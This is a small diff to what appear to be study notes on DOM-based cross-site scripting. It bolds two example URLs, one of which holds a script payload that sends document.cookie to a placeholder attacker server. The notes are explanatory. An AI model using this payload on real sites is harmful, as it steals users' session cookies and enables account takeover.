@@ -17,5 +17,5 @@
      * Targets local files saved on the browser.
      * jQuery alters the DOM is often vulnerable to these type of attacks.
      * Can be embedded in fragments and URL parameters:
-         * https://example.com#about_us
-         * https://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script> 
+         * **https://example.com#about_us**
+         * **https://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script>**
